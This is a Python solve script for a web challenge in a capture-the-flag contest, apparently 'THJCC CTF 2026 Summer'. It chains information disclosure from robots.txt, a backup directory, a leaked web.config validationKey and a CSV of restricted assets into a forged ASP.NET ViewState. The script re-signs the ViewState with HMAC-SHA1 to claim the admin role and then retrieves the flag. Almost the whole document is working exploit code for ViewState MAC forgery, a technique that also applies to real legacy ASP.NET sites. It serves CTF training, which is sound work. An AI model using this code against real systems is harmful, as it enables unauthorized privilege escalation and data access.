#!/usr/bin/env python3
"""Contoso Asset Portal -- THJCC CTF 2026 Summer (web, 100 pts).

A mock "legacy ASP.NET 2.0" app whose search form carries an ASP.NET
`__VIEWSTATE`. The ViewState holds the caller's role and asset id and is
protected by an HMAC-SHA1 MAC (EnableViewStateMac), so it cannot be tampered
with -- unless you know the machineKey validationKey.

The full chain, standard library only:

  1. GET /robots.txt          -> Disallow: /backup/
  2. GET /backup/             -> directory listing:
                                   2024-legacy-web.config~   (leaks the key)
                                   assets.csv.bak            (lists a
                                                              `restricted` asset)
  3. From the config backup:   validationKey (hex), validation="SHA1"
     From the CSV:             the confidential asset id (classification
                               `restricted`), e.g. AST-4F2A9C0
  4. The ViewState is:  b"\\xff\\x01\\x0c" + str(role) + str(asset) + HMAC-SHA1
     where each str is  b"\\x01" + len_byte + bytes, and
         MAC = HMAC_SHA1(key = bytes.fromhex(validationKey), msg = data)
     (verified byte-for-byte against the site's original guest ViewState).
  5. Forge a ViewState with role="admin" AND asset=<the restricted id> -- both
     are gated -- re-sign with the leaked key, POST it, and read the flag.

    python3 solve.py [BASE_URL]
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import re
import sys
import urllib.parse
import urllib.request
import urllib.error

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chal.thjcc.org:31241"


def get(path: str) -> str:
    return urllib.request.urlopen(BASE + path, timeout=20).read().decode("utf-8", "replace")


def post(vs: str, q: str) -> str:
    body = urllib.parse.urlencode({"__VIEWSTATE": vs, "q": q}).encode()
    req = urllib.request.Request(BASE + "/Default.aspx", data=body)
    try:
        return urllib.request.urlopen(req, timeout=20).read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}\n" + e.read().decode("utf-8", "replace")


def build_viewstate(role: str, asset: str, key: bytes) -> str:
    """Rebuild the ViewState object graph and sign it with HMAC-SHA1."""
    def s(x: bytes) -> bytes:                       # a length-prefixed string node
        return b"\x01" + bytes([len(x)]) + x
    data = b"\xff\x01\x0c" + s(role.encode()) + s(asset.encode())
    mac = hmac.new(key, data, hashlib.sha1).digest()
    return base64.b64encode(data + mac).decode()


def main() -> int:
    # 1) robots.txt -> backup dir
    robots = get("/robots.txt")
    backup = re.search(r"Disallow:\s*(\S+)", robots)
    backup_dir = backup.group(1) if backup else "/backup/"
    print(f"[+] robots.txt discloses {backup_dir}")

    listing = get(backup_dir)
    cfg_name = re.search(r'href="([^"]*web\.config[^"]*)"', listing, re.I)
    csv_name = re.search(r'href="([^"]*\.csv[^"]*)"', listing, re.I)
    cfg_path = cfg_name.group(1) if cfg_name else backup_dir + "2024-legacy-web.config~"
    csv_path = csv_name.group(1) if csv_name else backup_dir + "assets.csv.bak"
    if not cfg_path.startswith("/"):
        cfg_path = backup_dir + cfg_path
    if not csv_path.startswith("/"):
        csv_path = backup_dir + csv_path

    # 2) leak the validationKey
    cfg = get(cfg_path)
    vk = re.search(r'validationKey="([0-9A-Fa-f]+)"', cfg).group(1)
    val = re.search(r'validation="([^"]+)"', cfg)
    print(f"[+] leaked validationKey ({len(vk)} hex chars), validation={val.group(1) if val else '?'}")
    key = bytes.fromhex(vk)

    # 3) find the confidential (restricted) asset id
    csv = get(csv_path)
    restricted = None
    for line in csv.splitlines():
        cols = line.split(",")
        if len(cols) >= 4 and cols[-1].strip().lower() == "restricted":
            restricted = cols[0].strip()
    print(f"[+] restricted asset id from CSV: {restricted}")

    # 3b) verify the MAC recipe against the site's real guest ViewState
    home = get("/")
    orig = re.search(r"__VIEWSTATE'\s*value='([^']+)'", home).group(1)
    raw = base64.b64decode(orig)
    data, mac = raw[:-20], raw[-20:]
    assert hmac.new(key, data, hashlib.sha1).digest() == mac, "MAC recipe mismatch!"
    print("[+] MAC recipe confirmed: HMAC-SHA1(hex(validationKey), data)")

    # 4) forge role=admin + the restricted asset, sign, submit
    forged = build_viewstate("admin", restricted, key)
    html = post(forged, restricted)
    m = re.search(r"THJCC\{[^}]*\}", html)
    if m:
        print(f"\n[+] flag: {m.group(0)}")
        return 0
    print("\n[-] no flag; server said:\n", re.sub(r"<[^>]+>", " ", html)[:400])
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
